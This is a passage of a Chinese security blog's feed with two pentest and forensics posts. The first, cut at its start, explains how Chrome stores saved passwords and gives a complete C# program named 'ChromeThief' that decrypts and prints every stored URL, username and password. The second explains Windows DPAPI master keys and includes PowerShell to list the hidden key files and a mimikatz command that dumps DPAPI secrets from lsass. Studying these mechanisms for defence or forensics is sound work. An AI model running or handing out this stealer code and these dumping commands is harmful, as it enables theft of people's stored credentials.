&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Login Data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;文件以json格式储存，encrypted_key 的值就是Windows dpapi加密过后的AES密钥&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230628135158057.png&quot; alt=&quot;image-20230628135158057&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;login-data密文存放的位置&quot;&gt;Login Data——密文存放的位置&lt;/h2&gt;

&lt;p&gt;Sqlite3数据库&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;数据库结构，我们需要注意的几个字段的值&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;origin_url: 起始url
action_url: form表单提交的地址
username_value  用户名字段
password_value 密码字段
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;origin_url和action_url的选择需要注意，有时候用户手动添加的账户密码没有action_url字段的值。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230628140800353.png&quot; alt=&quot;image-20230628140800353&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;aes-解密过程&quot;&gt;AES-解密过程&lt;/h2&gt;

&lt;p&gt;AES-GCM解密不仅需要密钥，还需要偏移量。我们从Local Data数据库提取我们需要的字段，ciphey的值是密码AES加密后的值&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230628143438678.png&quot; alt=&quot;image-20230628143438678&quot; /&gt;&lt;/p&gt;

&lt;p&gt;它包含了两个重要的值：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Initialization vector （初始化向量）&lt;/li&gt;
  &lt;li&gt;Encrypted passwords （加密后的密码）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;用python代码解释这两者的位置，&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;initialisation_vector&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;encrypted_password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ciphertext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;按照上面的流程实现代码如下&lt;/p&gt;

&lt;h1 id=&quot;c-代码实现&quot;&gt;C# 代码实现&lt;/h1&gt;

&lt;p&gt;为什么用C#？&lt;/p&gt;

&lt;p&gt;刚开始想写个powershell的脚本调用的，但是实战装库等情况复杂。可能还是类C的实现实用&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;using System;
using System.Text;
using System.IO;
using System.Data.SQLite;
using System.Linq;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Security.Cryptography;


namespace ChromeThief
{
    class Program
    {
        // GLOBAL CONSTANT
        private static readonly string CHROME_PATH_LOCAL_STATE = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @&quot;Google\Chrome\User Data\Local State&quot;);
        private static readonly string CHROME_PATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @&quot;Google\Chrome\User Data&quot;);

        private static String DecryptPassword(byte[] encryptedPassword, byte[] iv, byte[] secretKey)
        {
            string sR = string.Empty; 
            try
            {
                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(secretKey), 128, iv, null);

                cipher.Init(false, parameters);
                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedPassword.Length)];
                Int32 retLen = cipher.ProcessBytes(encryptedPassword, 0, encryptedPassword.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd(&quot;\r\n\0&quot;.ToCharArray());
                //Console.WriteLine(sR);
                return sR;
            }
            catch (Exception e)
            {
                Console.WriteLine($&quot;{e.Message}&quot;);
                Console.WriteLine(&quot;[ERR] Unable to decrypt, Chrome version &amp;lt;80 not supported. Please check.&quot;);
                return null;
            }
        }


        private static byte[] GetSecretKey()
        {
            try
            {
                // Get secretkey from chrome local state
                var localState = File.ReadAllText(CHROME_PATH_LOCAL_STATE);
                dynamic json = Newtonsoft.Json.JsonConvert.DeserializeObject(localState);
                String key = json.os_crypt.encrypted_key;
                byte[] encryptedKeyBytes = Convert.FromBase64String(key);
                //Console.WriteLine(encryptedKeyBytes);
                byte[] encryptedKey = new byte[encryptedKeyBytes.Length - 5];
                Array.Copy(encryptedKeyBytes, 5, encryptedKey, 0, encryptedKey.Length);
                byte[] secretKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.LocalMachine);
                //Console.WriteLine(BitConverter.ToString(secretKey));  
                return secretKey;
            }
            catch (Exception e)
            {
                Console.WriteLine($&quot;{e.Message}&quot;);
                Console.WriteLine(&quot;[ERR] Chrome secretkey cannot be found&quot;);
                return null;
            }
        }
        
                static void Main(string[] args)
        {
            //Console.WriteLine(CHROME_PATH_LOCAL_STATE);
            //Console.WriteLine(CHROME_PATH);
            var folders = Directory.GetDirectories(CHROME_PATH, &quot;Profile*&quot;).Union(Directory.GetDirectories(CHROME_PATH, &quot;Default&quot;));
            var secretKey = GetSecretKey();
            //C: \Users\86176\AppData\Local\Google\Chrome\User Data\Default

            foreach (var folder in folders)	
            {
                //Console.WriteLine(folder);
                var chromePathLoginDb = Path.Combine(folder, &quot;Login Data&quot;);
                string connectionString = String.Format(&quot;Data Source={0};Version=3;&quot;, chromePathLoginDb);
                var conn = new SQLiteConnection(connectionString);
                conn.Open();
                SQLiteCommand cmd = new SQLiteCommand(&quot;SELECT origin_url, username_value, password_value FROM logins&quot;, conn);
                var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    var url = reader.GetString(0);
                    var username = reader.GetString(1);
                    var ciphertext = (byte[])reader.GetValue(2);
                    //Console.WriteLine(ciphertext);

                    if (!string.IsNullOrEmpty(url) &amp;amp;&amp;amp; !string.IsNullOrEmpty(username) &amp;amp;&amp;amp; ciphertext != null)
                    {
                        // Filter the initialisation vector &amp;amp; encrypted password from ciphertext
                        //byte[] iv = new byte[12];
                        //Array.Copy(ciphertext, 3, iv, 0, 12);
                        ////System.Array.Copy(encryptedData, 3 + iv.Length, ciphertextTag, 0, ciphertextTag.Length);
                        //byte[] encryptedPassword = new byte[ciphertext.Length - 15 - 16];
                        //Array.Copy(ciphertext, 15, encryptedPassword, 0, ciphertext.Length - 15 - 16);
                        byte[] iv = new byte[12];
                        byte[] ciphertextTag = new byte[ciphertext.Length - 3 - iv.Length];

                        System.Array.Copy(ciphertext, 3, iv, 0, iv.Length);
                        System.Array.Copy(ciphertext, 3 + iv.Length, ciphertextTag, 0, ciphertextTag.Length);
                        // Use AES algorithm to decrypt the password
                        Console.WriteLine($&quot;URL: {url}\nUser Name: {username}&quot;);
                        var decryptedPassword = DecryptPassword(ciphertextTag, iv, secretKey);
                        Console.WriteLine($&quot;Password: {decryptedPassword}\n&quot;);

                    }
                }
            }
        }

    }
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Fri, 12 May 2023 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/%E5%8F%96%E8%AF%81/windows%20dpapi/2023/05/12/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%E5%92%8CC-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0.html</link>
        <guid isPermaLink="true">http://localhost:4000/%E5%8F%96%E8%AF%81/windows%20dpapi/2023/05/12/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%E5%92%8CC-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0.html</guid>
        
        
        <category>取证</category>
        
        <category>windows DPAPI</category>
        
      </item>
    
      <item>
        <title>渗透取证技巧--Windows数据保护接口——DPAPI</title>
        <description>&lt;h1 id=&quot;文前漫谈&quot;&gt;文前漫谈&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;DPAPI&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Data Protection Application Programming Interface
数据保护应用程序编程接口
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;​	这是windows贴心的为开发者提供的针对用户身份加密的方案——DPAPI。win程序开发者可以方便的使用该API加密保护敏感数据，这种基于用户身份的加密使得该加密数据仅可被对数据进行加密的用户解密，它是Windows中保护敏感数据的首选API之一，被广泛应用于各种应用程序数据保护部分。&lt;/p&gt;

&lt;p&gt;DPAPI提供了两种方法：基于用户和基于机器的加密。在基于用户的加密中，系统会根据用户的凭据生成一个唯一的主密钥，并将其存储在用户的配置文件中。此主密钥用于加密和解密用户的私密数据。在基于机器的加密中，系统会根据计算机的凭据生成一个唯一的主密钥，并将其存储在本地计算机上。此主密钥用于加密和解密系统级别的数据。&lt;/p&gt;

&lt;p&gt;DPAPI针对用户身份加密的方案可以抽象理解为，不同用户拥有不同的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DPAPI master key&lt;/code&gt;，一个用户也可能有不同的master key，这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DPAPI master key&lt;/code&gt; 相当于一个密钥，这个调用`DPAPI master key实施加密的过程由系统直接操作，相当于Windows给开发者封装了个加密算法，直接调用就能实现的敏感数据的加密解密保护&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;我们渗透场景中的哪些应用采用了DBAPI&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Internet Explorer, Google Chrome浏览器保存的登录凭据&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Outlook, Windows Mai 等的邮箱账户密码&lt;/li&gt;
  &lt;li&gt;内部FTP管理器帐户密码&lt;/li&gt;
  &lt;li&gt;共享文件夹和资源访问密码&lt;/li&gt;
  &lt;li&gt;无线网络帐户密钥和密码&lt;/li&gt;
  &lt;li&gt;RDP远程桌面连接密码&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;dpapi中的重要概念&quot;&gt;DPAPI中的重要概念&lt;/h1&gt;

&lt;h2 id=&quot;function-cryptprotectdata-and-cryptunprotectdata&quot;&gt;Function CryptProtectData and CryptUnprotectData&lt;/h2&gt;

&lt;p&gt;分别是DPAPI的加密和解密函数，详细见文档 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata&quot;&gt;CryptProtectData function (dpapi.h) - Win32 apps | Microsoft Learn&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Win32 API中的函数，均在Dpapi.h头文件中&lt;/p&gt;

&lt;h2 id=&quot;dpapi-blob&quot;&gt;DPAPI blob&lt;/h2&gt;

&lt;p&gt;在计算机术语中，”blob” 是 “Binary Large Object” 的缩写。它是指一种数据类型或格式，用于存储二进制数据。&lt;/p&gt;

&lt;p&gt;在DPAPI中，”DPAPI blob” 是指使用DPAPI进行加密保护的二进制数据块。但是它实际是个结构体，其中包含了我们的密文&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dpapi3.png&quot; alt=&quot;未记录的 DPAPI blob 结构&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;master-key&quot;&gt;Master Key：&lt;/h2&gt;

&lt;p&gt;DPAPI的核心&lt;/p&gt;

&lt;p&gt;64字节，用于解密DPAPI blob，使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中&lt;/p&gt;

&lt;p&gt;Example：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;19c05880b67d50f8231cd8009836e3cdc55610e4877f8b976abd5ca15600d0e759934324c6204b56f02527039e7fc52a1dfb5296d3381aaa7c3eb610dffa32fa

长度是128
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;master-key-file&quot;&gt;Master Key file：&lt;/h2&gt;

&lt;p&gt;二进制文件，可使用用户登录密码对其解密，获得Master Key。其所在目录受保护，即使你在资源管理器中开启了显示隐藏文件也看不了，或者cmd的dir命令，也无法看见。不过可以用powershell看，下面介绍。&lt;/p&gt;

&lt;p&gt;分两种：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;用户Master Key file，隐藏属性不可解，位于&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;%APPDATA%\Microsoft\Protect{SID}		//SID是当前用户的安全标识符&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;powershell -Force可以查看（-hidden也能看，不过winows低版本不支持-hidden的参数）&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$path=$env:APPDATA+&quot;\Microsoft\Protect\&quot;+(((iex &quot;whoami /user&quot;)|Out-String).Split(&apos; &apos;))[-1];Get-ChildItem -Force $path.trim()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230618192232242.png&quot; alt=&quot;image-20230618192232242&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;系统Master Key file，隐藏属性不可见，位于&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;powershell查看&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Get-ChildItem -Force $env:windir\System32\Microsoft\Protect\S-1-5-18\User		
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230618174621882.png&quot; alt=&quot;image-20230618174621882&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;preferred文件&quot;&gt;Preferred文件：&lt;/h2&gt;

&lt;p&gt;总是位于Master Key file的同级目录，显示当前系统正在使用的MasterKey及其过期时间，默认90天有效期&lt;/p&gt;

&lt;h1 id=&quot;如何获得master-key&quot;&gt;如何获得Master Key&lt;/h1&gt;

&lt;h2 id=&quot;mimikatz从lsassexe进程dump&quot;&gt;mimikatz从lsass.exe进程dump&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mimikatz.exe privilege::debug sekurlsa::dpapi &amp;gt; dbapi.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230618181455536.png&quot; alt=&quot;image-20230618181455536&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;另一种就是离线dump，也差不多就不写了，或许是好处是不需要在对面的机子上用mimikatz？&lt;/p&gt;

&lt;h1 id=&quot;c-实现dpapi加密和解密&quot;&gt;C# 实现DPAPI加密和解密&lt;/h1&gt;

&lt;p&gt;从代码实现来说，我们作为开发者写工具的时候，肯定是对上面所说的master key是无感的。这意味着我们开发工具（比如解密浏览器凭据）的时候，是直接调用Windows api里的两个函数的，举个例子&lt;/p&gt;

&lt;div class=&quot;language-c# highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Security.Cryptography&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;TestDemo&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Program&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;en&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pool&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WriteLine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Data encrypt by dpapi：\n&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;en&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;de&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;en&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WriteLine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Data decrypt by dpapi：\n&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;de&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// first, convert the text to byte array &lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;originalText&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Unicode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;c1&quot;&gt;// then use Protect() to encrypt your data &lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encryptedText&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProtectedData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Protect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;originalText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataProtectionScope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CurrentUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ToBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encryptedText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// the encrypted text, converted to byte array &lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encryptedText&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;c1&quot;&gt;// calling Unprotect() that returns the original text &lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;originalText&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProtectedData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Unprotect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encryptedText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataProtectionScope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CurrentUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Unicode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;originalText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;调用输出&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230627170101035.png&quot; alt=&quot;image-20230627170101035&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;后话&quot;&gt;后话&lt;/h1&gt;

&lt;p&gt;这是我当时遇见的一些问题&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;我们可以使用用户登录密码对Master Key file解密获得Master Key。那么问题来了，只有NTLM Hash的情况下，能否对Master Key file文件解密得到Master Key&lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;p&gt;分情况，如果NTLM Hash能成功解密，拿到用户明文密码，就能通过解密Master Key file文件得到Master Key;&lt;/p&gt;

  &lt;p&gt;如果解密不了，就无法得到Master Key（但是如果能得到NTLM Hash，Master Key大概率也是能抓到的）。&lt;/p&gt;

  &lt;p&gt;为什么？因为最初的DPAPI设计中，解密Master key需要用户密码的 NTLM Hash，导致直接能够通过拿到SAM数据库中用户密码哈希，直接解密得到Master Key，进一步解密任何加密的DPAPI data blob，这个问题在DPAPI的第二版就被修复了，现在master key使用 SHA1 哈希进行加密，MS特意回避了能够通过NTLM Hash解密获得master key的情况。&lt;/p&gt;
&lt;/blockquote&gt;

</description>
        <pubDate>Fri, 12 May 2023 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/%E5%8F%96%E8%AF%81/windows%20dpapi/2023/05/12/Windows%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8E%A5%E5%8F%A3-DBAPI.html</link>
        <guid isPermaLink="true">http://localhost:4000/%E5%8F%96%E8%AF%81/windows%20dpapi/2023/05/12/Windows%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8E%A5%E5%8F%A3-DBAPI.html</guid>
        
        
